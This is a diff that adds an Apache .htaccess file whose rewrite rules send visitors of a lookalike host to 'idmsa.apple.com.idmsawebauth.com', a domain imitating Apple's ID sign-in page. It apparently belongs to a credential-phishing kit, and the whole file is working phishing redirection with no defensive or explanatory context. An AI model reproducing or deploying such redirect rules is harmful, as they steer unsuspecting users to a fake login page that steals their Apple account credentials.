@@ -1,0 +1,6 @@
+
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^cooljob\.apple\.idmsawebauth\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.cooljob\.apple\.idmsawebauth\.com$
+RewriteRule ^/?$ "http\:\/\/idmsa\.apple\.com\.idmsawebauth\.com\/IDMSWebAuth\/login\.html\?appIdKey\=05c7e09b5896b0334b35d57cea43564ad699eb93fb46e9beb9c26cc3091ba2bf\&path\=\/authenticate\/signin" [R=301,L]
+
